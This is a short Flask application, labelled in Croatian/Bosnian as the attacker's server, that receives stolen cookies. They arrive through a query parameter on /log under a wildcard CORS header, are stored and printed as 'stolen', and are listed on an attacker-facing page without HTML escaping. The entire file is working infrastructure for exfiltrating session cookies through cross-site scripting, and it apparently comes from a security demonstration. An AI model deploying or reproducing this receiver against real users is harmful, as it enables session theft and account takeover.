from flask import Flask, request, Response
import os

app = Flask(__name__)

log_entries = []


@app.route("/log")
def log():
    cookie = request.args.get("c", "")
    log_entries.append(cookie)
    print("UKRADENO:", cookie, flush=True)

    resp = Response("logged")
    resp.headers["Access-Control-Allow-Origin"] = "*"
    return resp


@app.route("/")
def home():
    if log_entries:
        items = "".join(f"<li>{entry}</li>" for entry in log_entries)
    else:
        items = "<li>(jos nema ukradenih podataka)</li>"

    return f"""<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Napadacev log</title></head>
<body style="font-family: system-ui, sans-serif; max-width: 600px; margin: 60px auto;">
  <h1>Ukradeni podaci (napadacev server)</h1>
  <ul>{items}</ul>
  <p><a href="/">Osvjezi</a></p>
</body>
</html>"""


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 9000))
    app.run(host="0.0.0.0", port=port)